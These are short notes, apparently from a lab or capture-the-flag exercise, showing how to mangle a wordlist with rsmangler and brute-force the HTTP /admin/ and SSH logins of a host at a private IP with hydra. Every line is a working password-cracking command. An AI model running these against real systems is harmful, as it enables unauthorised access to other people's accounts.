
## rsmangler
mangles password lists. only use 4-5 words
```
rsmangler --file pippin.small.txt -o pippin.mangled.txt --min 9 --max 12
```

## hydra
http protected page
```
hydra -l frodo -P frodo.mangled.txt 10.0.5.21 http-get /admin/ -t 4
```
ssh
```
hydra -l frodo.baggins -P frodo.mangled.txt 10.0.5.21 -t 4 ssh
```
